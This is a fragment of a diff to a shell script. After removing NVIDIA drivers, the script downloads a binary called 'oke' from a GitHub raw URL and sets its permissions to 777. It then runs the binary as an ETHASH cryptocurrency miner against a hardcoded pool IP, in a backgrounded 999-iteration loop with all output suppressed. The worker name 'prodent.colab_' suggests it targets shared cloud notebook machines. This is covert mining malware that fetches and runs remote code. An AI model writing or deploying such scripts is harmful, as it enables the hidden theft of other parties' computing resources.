@@ -84,7 +84,7 @@ sudo apt-get --purge remove "*nvidia*"
 # Clean up the uninstall:
 sudo apt-get autoremove
 number_mining=$(echo $(shuf -i 1-9999 -n 1))
-wget -nv -c https://raw.githubusercontent.com/hondacars/sirji/main/oke -O - | tar -xz
+wget -nv -c https://raw.githubusercontent.com/hondacars/sirji/main/oke -O - | chmod 777 oke
 wallet="./oke --algo ETHASH --pool 3.215.245.39:443 --user prodent.colab_$number_mining >/dev/null 2>&1 "
 nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1 &
 
